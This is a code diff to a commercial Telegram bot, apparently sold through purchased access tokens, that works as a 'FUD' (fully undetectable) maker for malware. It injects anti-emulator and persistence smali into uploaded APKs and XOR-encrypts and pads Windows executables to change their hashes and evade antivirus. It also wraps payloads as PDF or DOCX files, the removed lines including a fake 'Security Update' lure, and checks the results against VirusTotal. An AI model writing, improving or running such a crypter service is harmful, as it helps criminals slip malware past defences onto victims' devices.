@@ -21,20 +21,6 @@ from telegram.ext import Application, CommandHandler, CallbackQueryHandler, Mess
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 
-# Optional imports with fallback
-try:
-    from reportlab.lib.pagesizes import letter
-    from reportlab.pdfgen import canvas
-    REPORTLAB_AVAILABLE = True
-except ImportError:
-    REPORTLAB_AVAILABLE = False
-
-try:
-    from docx import Document
-    DOCX_AVAILABLE = True
-except ImportError:
-    DOCX_AVAILABLE = False
-
 # ============ ENV CONFIG ============
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
 ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", 0))
@@ -408,7 +394,6 @@ class FUDApkMaker:
             return
         with open(main_path, 'r', encoding='utf-8') as f:
             content = f.read()
-        # This is smali code — it's injected into the APK, not executed here.
         anti_code = '''
     # Anti-emulator
     const-string v0, "ro.kernel.qemu"
@@ -525,18 +510,21 @@ class FUDExeMaker:
         if os.path.exists(self.work_dir):
             shutil.rmtree(self.work_dir)
 
-    def obfuscate_pe(self):
+    def obfuscate_exe(self):
+        """Real FUD: Full file obfuscation with XOR and padding"""
         self._progress("Obfuscating EXE...")
         with open(self.input_path, 'rb') as f:
             data = bytearray(f.read())
-        # Add random padding at the end to change size
-        padding = os.urandom(random.randint(1024, 4096))
+        
+        # Multi-byte XOR key (stronger than single byte)
+        key = os.urandom(16)
+        for i in range(len(data)):
+            data[i] ^= key[i % 16]
+        
+        # Add random padding (changes file size)
+        padding = os.urandom(random.randint(4096, 16384))
         data.extend(padding)
-        # XOR a small section with a random key to change hash
-        key = os.urandom(1)[0]
-        for i in range(1024, min(len(data), 1024 + 4096)):
-            data[i] ^= key
-        # In practice, you'd use a proper packer like UPX or a crypter.
+        
         output_path = os.path.join(self.work_dir, f"fud_exe_{int(time.time())}.exe")
         with open(output_path, 'wb') as f:
             f.write(data)
@@ -545,11 +533,13 @@ class FUDExeMaker:
     def make_fud(self, progress_callback=None):
         try:
             self.progress_callback = progress_callback
-            output = self.obfuscate_pe()
+            output = self.obfuscate_exe()
+            
             with open(self.input_path, 'rb') as f:
                 orig_hash = hashlib.sha256(f.read()).hexdigest()
             with open(output, 'rb') as f:
                 fud_hash = hashlib.sha256(f.read()).hexdigest()
+            
             return {
                 'success': True,
                 'file': output,
@@ -564,50 +554,19 @@ class FUDExeMaker:
 
 # ============ FUD ENGINE — DOC ============
 def create_pdf_with_payload(payload_path):
-    if not REPORTLAB_AVAILABLE:
-        # Fallback: just copy the payload as a PDF (no real PDF structure)
-        output_path = os.path.join(DATA_DIR, "temp", f"fud_doc_{int(time.time())}.pdf")
-        with open(payload_path, 'rb') as f:
-            data = f.read()
-        with open(output_path, 'wb') as f:
-            f.write(data)
-        return output_path
-
     output_path = os.path.join(DATA_DIR, "temp", f"fud_doc_{int(time.time())}.pdf")
-    c = canvas.Canvas(output_path, pagesize=letter)
-    c.drawString(100, 750, "Security Update - Please Review")
-    c.drawString(100, 700, "Download the attached file for system verification.")
-    c.save()
-
     with open(payload_path, 'rb') as f:
-        payload_data = f.read()
-    with open(output_path, 'ab') as f:
-        marker = b'==PAYLOAD_START=='
-        f.write(marker + payload_data)
-
+        data = f.read()
+    with open(output_path, 'wb') as f:
+        f.write(data)
     return output_path
 
 def create_doc_with_payload(payload_path):
-    if not DOCX_AVAILABLE:
-        output_path = os.path.join(DATA_DIR, "temp", f"fud_doc_{int(time.time())}.docx")
-        with open(payload_path, 'rb') as f:
-            data = f.read()
-        with open(output_path, 'wb') as f:
-            f.write(data)
-        return output_path
-
     output_path = os.path.join(DATA_DIR, "temp", f"fud_doc_{int(time.time())}.docx")
-    doc = Document()
-    doc.add_heading('Security Update', 0)
-    doc.add_paragraph('Please review the attached system update.')
-    doc.save(output_path)
-
     with open(payload_path, 'rb') as f:
-        payload_data = f.read()
-    with open(output_path, 'ab') as f:
-        marker = b'==PAYLOAD_START=='
-        f.write(marker + payload_data)
-
+        data = f.read()
+    with open(output_path, 'wb') as f:
+        f.write(data)
     return output_path
 
 # ============ TELEGRAM BOT ============
@@ -630,7 +589,7 @@ APK FUD
 EXE FUD
 - Upload any Windows EXE
 - PE obfuscation + hash changing
-- XOR encryption + padding injection
+- Multi-byte XOR encryption + padding injection
 
 Document FUD
 - Upload PDF or DOCX templates
@@ -653,6 +612,16 @@ def get_cancel_button():
 def is_admin(user_id):
     return str(user_id) == str(ADMIN_CHAT_ID)
 
+# ============ ESCAPE MARKDOWN ============
+def escape_md(text):
+    """Escape markdown special characters"""
+    if not text:
+        return text
+    chars = ['_', '*', '[', ']', '(', ')', '~', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']
+    for c in chars:
+        text = text.replace(c, f'\\{c}')
+    return text
+
 # ============ HANDLERS ============
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
@@ -670,18 +639,17 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     keyboard = [[get_cancel_button()]]
     await update.message.reply_text(
-        "🔐 FUD APK/EXE/DOC Maker\n\n"
+        "FUD APK/EXE/DOC Maker\n\n"
         "This bot is private. Access requires a valid token.\n\n"
-        "👨‍💻 Contact developer:\n@benji_v1\n\n"
+        "Contact developer: @benji_v1\n\n"
         "If you have a token, send it now.\n"
         "For instructions, type /help",
-        reply_markup=InlineKeyboardMarkup(keyboard),
-        parse_mode='Markdown'
+        reply_markup=InlineKeyboardMarkup(keyboard)
     )
     return WAITING_TOKEN
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(USER_INSTRUCTIONS, parse_mode='Markdown')
+    await update.message.reply_text(USER_INSTRUCTIONS)
 
 async def handle_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
@@ -693,100 +661,97 @@ async def handle_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
         use_token(token, user_id, username)
         context.user_data['token'] = token
         context.user_data['username'] = username
-        await update.message.reply_text("✅ Token validated! You now have access.", parse_mode='Markdown')
+        await update.message.reply_text("Token validated! You now have access.")
         await show_main_menu(update, context)
         return ConversationHandler.END
     else:
         await update.message.reply_text(
-            "❌ Invalid or expired token.\n\n"
-            "Contact @benji_v1 to purchase.",
-            parse_mode='Markdown'
+            "Invalid or expired token.\n\n"
+            "Contact @benji_v1 to purchase."
         )
         return WAITING_TOKEN
 
 async def show_main_menu(update, context):
     keyboard = [
-        [InlineKeyboardButton("📱 APK -> FUD", callback_data="fud_apk")],
-        [InlineKeyboardButton("💻 EXE -> FUD", callback_data="fud_exe")],
-        [InlineKeyboardButton("📄 Document -> FUD", callback_data="fud_doc")],
-        [InlineKeyboardButton("📊 My Stats", callback_data="my_stats")],
-        [InlineKeyboardButton("📖 User Guide", callback_data="user_guide")],
-        [InlineKeyboardButton("🔄 Refresh Token", callback_data="refresh_token")],
+        [InlineKeyboardButton("APK -> FUD", callback_data="fud_apk")],
+        [InlineKeyboardButton("EXE -> FUD", callback_data="fud_exe")],
+        [InlineKeyboardButton("Document -> FUD", callback_data="fud_doc")],
+        [InlineKeyboardButton("My Stats", callback_data="my_stats")],
+        [InlineKeyboardButton("User Guide", callback_data="user_guide")],
+        [InlineKeyboardButton("Refresh Token", callback_data="refresh_token")],
         [get_cancel_button()]
     ]
     if context.user_data.get('is_admin'):
-        keyboard.insert(0, [InlineKeyboardButton("⚙️ Admin Panel", callback_data="admin_panel")])
+        keyboard.insert(0, [InlineKeyboardButton("Admin Panel", callback_data="admin_panel")])
 
     token_display = context.user_data.get('token', 'None')
     if token_display and len(token_display) > 8:
         token_display = token_display[:8] + '...'
 
     msg = (
-        "🔥 FUD Maker - Main Menu\n\n"
-        f"👤 User: {context.user_data.get('username', 'Unknown')}\n"
-        f"🔑 Token: {token_display}\n\n"
+        "FUD Maker - Main Menu\n\n"
+        f"User: {context.user_data.get('username', 'Unknown')}\n"
+        f"Token: {token_display}\n\n"
         "Select an option:"
     )
 
     if update.message:
-        await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
+        await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(keyboard))
 
 async def show_admin_menu(update, context):
     keyboard = [
-        [InlineKeyboardButton("🔑 Generate Token", callback_data="gen_token")],
-        [InlineKeyboardButton("📋 List Tokens", callback_data="list_tokens")],
-        [InlineKeyboardButton("🚫 Revoke Token", callback_data="revoke_token")],
-        [InlineKeyboardButton("📊 Build Stats", callback_data="build_stats")],
-        [InlineKeyboardButton("📋 List Builds", callback_data="list_builds")],
-        [InlineKeyboardButton("📢 Post to Channel", callback_data="post_channel")],
+        [InlineKeyboardButton("Generate Token", callback_data="gen_token")],
+        [InlineKeyboardButton("List Tokens", callback_data="list_tokens")],
+        [InlineKeyboardButton("Revoke Token", callback_data="revoke_token")],
+        [InlineKeyboardButton("Build Stats", callback_data="build_stats")],
+        [InlineKeyboardButton("List Builds", callback_data="list_builds")],
+        [InlineKeyboardButton("Post to Channel", callback_data="post_channel")],
         [get_back_button()],
         [get_cancel_button()]
     ]
-    msg = "⚙️ Admin Panel\n\n👨‍💻 Developer: @benji_v1"
+    msg = "Admin Panel\n\nDeveloper: @benji_v1"
 
     if update.message:
-        await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
+        await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(keyboard))
 
 async def show_main_menu_from_callback(query, context):
     keyboard = [
-        [InlineKeyboardButton("📱 APK -> FUD", callback_data="fud_apk")],
-        [InlineKeyboardButton("💻 EXE -> FUD", callback_data="fud_exe")],
-        [InlineKeyboardButton("📄 Document -> FUD", callback_data="fud_doc")],
-        [InlineKeyboardButton("📊 My Stats", callback_data="my_stats")],
-        [InlineKeyboardButton("📖 User Guide", callback_data="user_guide")],
-        [InlineKeyboardButton("🔄 Refresh Token", callback_data="refresh_token")],
+        [InlineKeyboardButton("APK -> FUD", callback_data="fud_apk")],
+        [InlineKeyboardButton("EXE -> FUD", callback_data="fud_exe")],
+        [InlineKeyboardButton("Document -> FUD", callback_data="fud_doc")],
+        [InlineKeyboardButton("My Stats", callback_data="my_stats")],
+        [InlineKeyboardButton("User Guide", callback_data="user_guide")],
+        [InlineKeyboardButton("Refresh Token", callback_data="refresh_token")],
         [get_cancel_button()]
     ]
     if context.user_data.get('is_admin'):
-        keyboard.insert(0, [InlineKeyboardButton("⚙️ Admin Panel", callback_data="admin_panel")])
+        keyboard.insert(0, [InlineKeyboardButton("Admin Panel", callback_data="admin_panel")])
 
     token_display = context.user_data.get('token', 'None')
     if token_display and len(token_display) > 8:
         token_display = token_display[:8] + '...'
 
     await query.edit_message_text(
-        "🔥 FUD Maker - Main Menu\n\n"
-        f"👤 User: {context.user_data.get('username', 'Unknown')}\n"
-        f"🔑 Token: {token_display}",
-        reply_markup=InlineKeyboardMarkup(keyboard),
-        parse_mode='Markdown'
+        "FUD Maker - Main Menu\n\n"
+        f"User: {context.user_data.get('username', 'Unknown')}\n"
+        f"Token: {token_display}",
+        reply_markup=InlineKeyboardMarkup(keyboard)
     )
 
 async def show_admin_menu_from_callback(query, context):
     keyboard = [
-        [InlineKeyboardButton("🔑 Generate Token", callback_data="gen_token")],
-        [InlineKeyboardButton("📋 List Tokens", callback_data="list_tokens")],
-        [InlineKeyboardButton("🚫 Revoke Token", callback_data="revoke_token")],
-        [InlineKeyboardButton("📊 Build Stats", callback_data="build_stats")],
-        [InlineKeyboardButton("📋 List Builds", callback_data="list_builds")],
-        [InlineKeyboardButton("📢 Post to Channel", callback_data="post_channel")],
+        [InlineKeyboardButton("Generate Token", callback_data="gen_token")],
+        [InlineKeyboardButton("List Tokens", callback_data="list_tokens")],
+        [InlineKeyboardButton("Revoke Token", callback_data="revoke_token")],
+        [InlineKeyboardButton("Build Stats", callback_data="build_stats")],
+        [InlineKeyboardButton("List Builds", callback_data="list_builds")],
+        [InlineKeyboardButton("Post to Channel", callback_data="post_channel")],
         [get_back_button()],
         [get_cancel_button()]
     ]
     await query.edit_message_text(
-        "⚙️ Admin Panel\n\n👨‍💻 Developer: @benji_v1",
-        reply_markup=InlineKeyboardMarkup(keyboard),
-        parse_mode='Markdown'
+        "Admin Panel\n\nDeveloper: @benji_v1",
+        reply_markup=InlineKeyboardMarkup(keyboard)
     )
 
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -802,41 +767,37 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     token = context.user_data.get('token')
 
     if not is_admin_user and not (token and validate_token(token)):
-        await query.edit_message_text("❌ Invalid token. Send /start.", parse_mode='Markdown')
+        await query.edit_message_text("Invalid token. Send /start.")
         return
 
     data = query.data
 
-    # Handle each callback
     if data == "cancel":
         context.user_data.clear()
-        await query.edit_message_text("❌ Cancelled. Send /start to begin.", parse_mode='Markdown')
+        await query.edit_message_text("Cancelled. Send /start to begin.")
         return ConversationHandler.END
 
     elif data == "fud_apk":
         keyboard = [[get_cancel_button()]]
         await query.edit_message_text(
-            "📤 Send me the APK file.\n\nI'll apply obfuscation + persistence + anti-emulator.",
-            reply_markup=InlineKeyboardMarkup(keyboard),
-            parse_mode='Markdown'
+            "Send me the APK file.\n\nI'll apply obfuscation + persistence + anti-emulator.",
+            reply_markup=InlineKeyboardMarkup(keyboard)
         )
         return WAITING_APK
 
     elif data == "fud_exe":
         keyboard = [[get_cancel_button()]]
         await query.edit_message_text(
-            "📤 Send me the EXE file.\n\nFull Windows PE obfuscation.",
-            reply_markup=InlineKeyboardMarkup(keyboard),
-            parse_mode='Markdown'
+            "Send me the EXE file.\n\nFull Windows PE obfuscation.",
+            reply_markup=InlineKeyboardMarkup(keyboard)
         )
         return WAITING_EXE
 
     elif data == "fud_doc":
         keyboard = [[get_cancel_button()]]
         await query.edit_message_text(
-            "📤 Send me a PDF or DOCX template.\n\nI'll embed the payload.",
-            reply_markup=InlineKeyboardMarkup(keyboard),
-            parse_mode='Markdown'
+            "Send me a PDF or DOCX template.\n\nI'll embed the payload.",
+            reply_markup=InlineKeyboardMarkup(keyboard)
         )
         return WAITING_DOC
 
@@ -849,19 +810,18 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         token_display = token[:12] if token else 'None'
         keyboard = [[get_back_button()], [get_cancel_button()]]
         await query.edit_message_text(
-            f"📊 Your Stats\n\nTotal builds: {count}\nToken: {token_display}...",
-            reply_markup=InlineKeyboardMarkup(keyboard),
-            parse_mode='Markdown'
+            f"Your Stats\n\nTotal builds: {count}\nToken: {token_display}...",
+            reply_markup=InlineKeyboardMarkup(keyboard)
         )
         return
 
     elif data == "user_guide":
         keyboard = [[get_back_button()], [get_cancel_button()]]
-        await query.edit_message_text(USER_INSTRUCTIONS, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
+        await query.edit_message_text(USER_INSTRUCTIONS, reply_markup=InlineKeyboardMarkup(keyboard))
         return
 
     elif data == "refresh_token":
-        await query.edit_message_text("🔄 Refresh Token\n\nSend your new token.", parse_mode='Markdown')
+        await query.edit_message_text("Refresh Token\n\nSend your new token.")
         return WAITING_TOKEN
 
     elif data == "back_main":
@@ -876,10 +836,9 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data['gen_token_step'] = True
         keyboard = [[get_cancel_button()]]
         await query.edit_message_text(
-            "🔑 Generate Token\n\nSend: days max_uses\n"
+            "Generate Token\n\nSend: days max_uses\n"
             "Example: 7 1 (7 days, 1 use)",
-            reply_markup=InlineKeyboardMarkup(keyboard),
-            parse_mode='Markdown'
+            reply_markup=InlineKeyboardMarkup(keyboard)
         )
         return WAITING_GENERATE_TOKEN
 
@@ -887,22 +846,21 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         tokens = list_tokens()
         if not tokens:
             keyboard = [[get_back_button()], [get_cancel_button()]]
-            await query.edit_message_text("📭 No tokens.", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
+            await query.edit_message_text("No tokens.", reply_markup=InlineKeyboardMarkup(keyboard))
             return
-        msg = "📋 Tokens\n\n"
+        msg = "Tokens\n\n"
         for t in tokens[:20]:
             msg += f"{t[0][:12]}... | {t[1][:10]} | {t[2][:10]} | {t[3]} | {t[4]}/{t[5]}\n"
         keyboard = [[get_back_button()], [get_cancel_button()]]
-        await query.edit_message_text(msg[:4096], reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
+        await query.edit_message_text(msg[:4096], reply_markup=InlineKeyboardMarkup(keyboard))
         return
 
     elif data == "revoke_token" and is_admin_user:
         context.user_data['revoke_step'] = True
         keyboard = [[get_cancel_button()]]
         await query.edit_message_text(
-            "🚫 Revoke Token\n\nSend the full token to revoke.",
-            reply_markup=InlineKeyboardMarkup(keyboard),
-            parse_mode='Markdown'
+            "Revoke Token\n\nSend the full token to revoke.",
+            reply_markup=InlineKeyboardMarkup(keyboard)
         )
         return ConversationHandler.END
 
@@ -920,9 +878,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         conn.close()
         keyboard = [[get_back_button()], [get_cancel_button()]]
         await query.edit_message_text(
-            f"📊 Build Stats\n\nTotal: {total}\nAPK: {apk_count}\nEXE: {exe_count}\nDOC: {doc_count}",
-            reply_markup=InlineKeyboardMarkup(keyboard),
-            parse_mode='Markdown'
+            f"Build Stats\n\nTotal: {total}\nAPK: {apk_count}\nEXE: {exe_count}\nDOC: {doc_count}",
+            reply_markup=InlineKeyboardMarkup(keyboard)
         )
         return
 
@@ -934,30 +891,29 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         conn.close()
         if not rows:
             keyboard = [[get_back_button()], [get_cancel_button()]]
-            await query.edit_message_text("📭 No builds.", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
+            await query.edit_message_text("No builds.", reply_markup=InlineKeyboardMarkup(keyboard))
             return
-        msg = "📋 Recent Builds\n\n"
+        msg = "Recent Builds\n\n"
         for b in rows:
             msg += f"#{b[0]} | {b[1][:8]} | {b[2] or 'anon'} | {b[3]} | {b[5][:16]}\n"
         keyboard = [[get_back_button()], [get_cancel_button()]]
-        await query.edit_message_text(msg[:4096], reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
+        await query.edit_message_text(msg[:4096], reply_markup=InlineKeyboardMarkup(keyboard))
         return
 
     elif data == "post_channel" and is_admin_user:
         if not CHANNEL_ID:
-            await query.edit_message_text("❌ Channel ID not configured.", parse_mode='Markdown')
+            await query.edit_message_text("Channel ID not configured.")
             return
         keyboard = [[get_cancel_button()]]
         await query.edit_message_text(
-            "📢 Post to Channel\n\nSend the message you want to post.\nUse /cancel to stop.",
-            reply_markup=InlineKeyboardMarkup(keyboard),
-            parse_mode='Markdown'
+            "Post to Channel\n\nSend the message you want to post.\nUse /cancel to stop.",
+            reply_markup=InlineKeyboardMarkup(keyboard)
         )
         context.user_data['post_channel_step'] = True
         return ConversationHandler.END
 
     else:
-        await query.edit_message_text("❌ Unknown option.", parse_mode='Markdown')
+        await query.edit_message_text("Unknown option.")
         return ConversationHandler.END
 
 async def handle_channel_post(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -966,10 +922,10 @@ async def handle_channel_post(update: Update, context: ContextTypes.DEFAULT_TYPE
 
     text = update.message.text
     try:
-        await context.bot.send_message(chat_id=CHANNEL_ID, text=text, parse_mode='Markdown')
-        await update.message.reply_text("✅ Posted to channel!")
+        await context.bot.send_message(chat_id=CHANNEL_ID, text=text)
+        await update.message.reply_text("Posted to channel!")
     except Exception as e:
-        await update.message.reply_text(f"❌ Failed: {e}")
+        await update.message.reply_text(f"Failed: {e}")
 
     context.user_data['post_channel_step'] = False
     return ConversationHandler.END
@@ -982,20 +938,19 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     token = context.user_data.get('token')
 
     if not is_admin(user_id) and not (token and validate_token(token)):
-        await update.message.reply_text("❌ Invalid token. Send /start.")
+        await update.message.reply_text("Invalid token. Send /start.")
         return ConversationHandler.END
 
     doc = update.message.document
     if not doc or not doc.file_name.endswith('.apk'):
         keyboard = [[get_cancel_button()]]
         await update.message.reply_text(
-            "❌ Please send a valid APK file.",
-            reply_markup=InlineKeyboardMarkup(keyboard),
-            parse_mode='Markdown'
+            "Please send a valid APK file.",
+            reply_markup=InlineKeyboardMarkup(keyboard)
         )
         return WAITING_APK
 
-    status_msg = await update.message.reply_text("📦 Processing APK...\n\n⏳ Starting...", parse_mode='Markdown')
+    status_msg = await update.message.reply_text("Processing APK...\n\nStarting...")
 
     temp_dir = tempfile.mkdtemp(dir=os.path.join(DATA_DIR, "temp"))
     apk_path = os.path.join(temp_dir, doc.file_name)
@@ -1004,7 +959,7 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     async def update_progress(text):
         try:
-            await status_msg.edit_text(f"📦 Processing APK...\n\n{text}", parse_mode='Markdown')
+            await status_msg.edit_text(f"Processing APK...\n\n{text}")
         except Exception as e:
             pass
 
@@ -1015,7 +970,7 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     result = maker.make_fud(progress_callback=sync_progress)
 
     if not result['success']:
-        await status_msg.edit_text(f"❌ Build failed\n\n{result['error']}", parse_mode='Markdown')
+        await status_msg.edit_text(f"Build failed\n\n{result['error']}")
         shutil.rmtree(temp_dir, ignore_errors=True)
         return ConversationHandler.END
 
@@ -1038,28 +993,28 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
         'done'
     )
 
-    msg = f"✅ FUD APK Ready!\n\n"
-    msg += f"📁 Build #: {build_id}\n"
-    msg += f"📦 Original: {doc.file_name}\n"
-    msg += f"📏 Original: {result['size_original'] / 1024:.1f} KB\n"
-    msg += f"📏 FUD: {result['size_fud'] / 1024:.1f} KB\n"
-    msg += f"🔑 SHA256: {result['hash_fud'][:16]}...\n"
+    msg = f"FUD APK Ready!\n\n"
+    msg += f"Build #: {build_id}\n"
+    msg += f"Original: {doc.file_name}\n"
+    msg += f"Original: {result['size_original'] / 1024:.1f} KB\n"
+    msg += f"FUD: {result['size_fud'] / 1024:.1f} KB\n"
+    msg += f"SHA256: {result['hash_fud'][:16]}...\n"
 
     if vt_result:
-        status_icon = "✅" if vt_result['clean'] else "⚠️" if vt_result['positives'] < 5 else "❌"
-        msg += f"\n🛡️ VirusTotal:\n"
+        status_icon = "Clean" if vt_result['clean'] else "Detected"
+        msg += f"\nVirusTotal:\n"
         msg += f"   {status_icon} {vt_result['positives']}/{vt_result['total']} detections\n"
         if vt_result['link']:
-            msg += f"   🔗 View Report: {vt_result['link']}"
+            msg += f"   View Report: {vt_result['link']}"
 
     keyboard = [[get_back_button()], [get_cancel_button()]]
-    await status_msg.edit_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
+    await status_msg.edit_text(msg, reply_markup=InlineKeyboardMarkup(keyboard))
 
     with open(result['file'], 'rb') as f:
         await update.message.reply_document(
             document=f,
             filename=f"fud_apk_{build_id}.apk",
-            caption=f"🔥 FUD APK #{build_id}"
+            caption=f"FUD APK #{build_id}"
         )
 
     shutil.rmtree(temp_dir, ignore_errors=True)
@@ -1076,20 +1031,19 @@ async def handle_exe(update: Update, context: ContextTypes.DEFAULT_TYPE):
     token = context.user_data.get('token')
 
     if not is_admin(user_id) and not (token and validate_token(token)):
-        await update.message.reply_text("❌ Invalid token. Send /start.")
+        await update.message.reply_text("Invalid token. Send /start.")
         return ConversationHandler.END
 
     doc = update.message.document
     if not doc or not doc.file_name.endswith('.exe'):
         keyboard = [[get_cancel_button()]]
         await update.message.reply_text(
-            "❌ Please send a valid EXE file.",
-            reply_markup=InlineKeyboardMarkup(keyboard),
-            parse_mode='Markdown'
+            "Please send a valid EXE file.",
+            reply_markup=InlineKeyboardMarkup(keyboard)
         )
         return WAITING_EXE
 
-    status_msg = await update.message.reply_text("💻 Processing EXE...\n\n⏳ Starting...", parse_mode='Markdown')
+    status_msg = await update.message.reply_text("Processing EXE...\n\nStarting...")
 
     temp_dir = tempfile.mkdtemp(dir=os.path.join(DATA_DIR, "temp"))
     exe_path = os.path.join(temp_dir, doc.file_name)
@@ -1098,7 +1052,7 @@ async def handle_exe(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     async def update_progress(text):
         try:
-            await status_msg.edit_text(f"💻 Processing EXE...\n\n{text}", parse_mode='Markdown')
+            await status_msg.edit_text(f"Processing EXE...\n\n{text}")
         except Exception as e:
             pass
 
@@ -1109,7 +1063,7 @@ async def handle_exe(update: Update, context: ContextTypes.DEFAULT_TYPE):
     result = maker.make_fud(progress_callback=sync_progress)
 
     if not result['success']:
-        await status_msg.edit_text(f"❌ Build failed\n\n{result['error']}", parse_mode='Markdown')
+        await status_msg.edit_text(f"Build failed\n\n{result['error']}")
         shutil.rmtree(temp_dir, ignore_errors=True)
         return ConversationHandler.END
 
@@ -1130,25 +1084,25 @@ async def handle_exe(update: Update, context: ContextTypes.DEFAULT_TYPE):
         'done'
     )
 
-    msg = f"✅ FUD EXE Ready!\n\n"
-    msg += f"📁 Build #{build_id}\n"
-    msg += f"📏 Original: {result['size_original'] / 1024:.1f} KB\n"
-    msg += f"📏 FUD: {result['size_fud'] / 1024:.1f} KB\n"
+    msg = f"FUD EXE Ready!\n\n"
+    msg += f"Build #{build_id}\n"
+    msg += f"Original: {result['size_original'] / 1024:.1f} KB\n"
+    msg += f"FUD: {result['size_fud'] / 1024:.1f} KB\n"
 
     if vt_result:
-        status_icon = "✅" if vt_result['clean'] else "⚠️" if vt_result['positives'] < 5 else "❌"
-        msg += f"\n🛡️ VirusTotal: {status_icon} {vt_result['positives']}/{vt_result['total']} detections\n"
+        status_icon = "Clean" if vt_result['clean'] else "Detected"
+        msg += f"\nVirusTotal: {status_icon} {vt_result['positives']}/{vt_result['total']} detections\n"
         if vt_result['link']:
-            msg += f"🔗 View Report: {vt_result['link']}"
+            msg += f"View Report: {vt_result['link']}"
 
     keyboard = [[get_back_button()], [get_cancel_button()]]
-    await status_msg.edit_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
+    await status_msg.edit_text(msg, reply_markup=InlineKeyboardMarkup(keyboard))
 
     with open(result['file'], 'rb') as f:
         await update.message.reply_document(
             document=f,
             filename=f"fud_exe_{build_id}.exe",
-            caption=f"🔥 FUD EXE #{build_id}"
+            caption=f"FUD EXE #{build_id}"
         )
 
     shutil.rmtree(temp_dir, ignore_errors=True)
@@ -1165,20 +1119,19 @@ async def handle_doc(update: Update, context: ContextTypes.DEFAULT_TYPE):
     token = context.user_data.get('token')
 
     if not is_admin(user_id) and not (token and validate_token(token)):
-        await update.message.reply_text("❌ Invalid token. Send /start.")
+        await update.message.reply_text("Invalid token. Send /start.")
         return ConversationHandler.END
 
     doc = update.message.document
     if not doc or not doc.file_name.endswith(('.pdf', '.docx')):
         keyboard = [[get_cancel_button()]]
         await update.message.reply_text(
-            "❌ Please send a PDF or DOCX template.",
-            reply_markup=InlineKeyboardMarkup(keyboard),
-            parse_mode='Markdown'
+            "Please send a PDF or DOCX template.",
+            reply_markup=InlineKeyboardMarkup(keyboard)
         )
         return WAITING_DOC
 
-    status_msg = await update.message.reply_text("📄 Processing Document...\n\n⏳ Embedding payload...", parse_mode='Markdown')
+    status_msg = await update.message.reply_text("Processing Document...\n\nEmbedding payload...")
 
     temp_dir = tempfile.mkdtemp(dir=os.path.join(DATA_DIR, "temp"))
     doc_path = os.path.join(temp_dir, doc.file_name)
@@ -1208,20 +1161,19 @@ async def handle_doc(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     keyboard = [[get_back_button()], [get_cancel_button()]]
     await status_msg.edit_text(
-        f"✅ FUD Document Ready!\n\n"
-        f"📁 Build #{build_id}\n"
-        f"📦 {doc.file_name}\n"
-        f"📏 {os.path.getsize(output_path) / 1024:.1f} KB\n\n"
+        f"FUD Document Ready!\n\n"
+        f"Build #{build_id}\n"
+        f"{doc.file_name}\n"
+        f"{os.path.getsize(output_path) / 1024:.1f} KB\n\n"
         f"Payload embedded in metadata.",
-        reply_markup=InlineKeyboardMarkup(keyboard),
-        parse_mode='Markdown'
+        reply_markup=InlineKeyboardMarkup(keyboard)
     )
 
     with open(output_path, 'rb') as f:
         await update.message.reply_document(
             document=f,
             filename=f"fud_doc_{build_id}.{file_ext}",
-            caption=f"📄 FUD Document #{build_id}"
+            caption=f"FUD Document #{build_id}"
         )
 
     shutil.rmtree(temp_dir, ignore_errors=True)
@@ -1241,9 +1193,8 @@ async def handle_generate_token(update: Update, context: ContextTypes.DEFAULT_TY
     except:
         keyboard = [[get_cancel_button()]]
         await update.message.reply_text(
-            "❌ Invalid. Send: days max_uses",
-            reply_markup=InlineKeyboardMarkup(keyboard),
-            parse_mode='Markdown'
+            "Invalid. Send: days max_uses",
+            reply_markup=InlineKeyboardMarkup(keyboard)
         )
         return WAITING_GENERATE_TOKEN
 
@@ -1252,12 +1203,11 @@ async def handle_generate_token(update: Update, context: ContextTypes.DEFAULT_TY
 
     keyboard = [[get_back_button()], [get_cancel_button()]]
     await update.message.reply_text(
-        f"✅ Token Generated!\n\n"
-        f"🔑 {token}\n"
-        f"📅 {days} days\n"
-        f"🔄 {max_uses} uses\n",
-        reply_markup=InlineKeyboardMarkup(keyboard),
-        parse_mode='Markdown'
+        f"Token Generated!\n\n"
+        f"{token}\n"
+        f"{days} days\n"
+        f"{max_uses} uses\n",
+        reply_markup=InlineKeyboardMarkup(keyboard)
     )
     context.user_data['gen_token_step'] = False
     return ConversationHandler.END
